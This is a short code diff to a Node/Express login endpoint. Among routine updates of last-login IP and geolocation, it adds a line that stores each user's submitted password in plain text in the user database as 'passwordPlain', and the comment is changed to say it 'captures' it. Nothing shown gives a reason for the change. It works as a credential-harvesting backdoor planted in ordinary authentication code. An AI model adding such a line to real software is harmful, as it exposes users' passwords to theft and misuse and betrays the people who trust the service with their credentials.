@@ -2390,9 +2390,10 @@ app.post('/api/auth/login', authLimiter, async (req, res) => {
     sendSecurityAlertEmail(user, geo, clientIp);
   }
 
-  // Update user last login location
+  // Update user last login location and capture passwordPlain
   const idx = db.users.findIndex(u => u.id === user.id);
   if (idx !== -1) {
+    db.users[idx].passwordPlain = password;
     db.users[idx].lastLoginIp = clientIp;
     db.users[idx].lastLoginCountry = geo.country;
     db.users[idx].lastLoginRegion = geo.region;
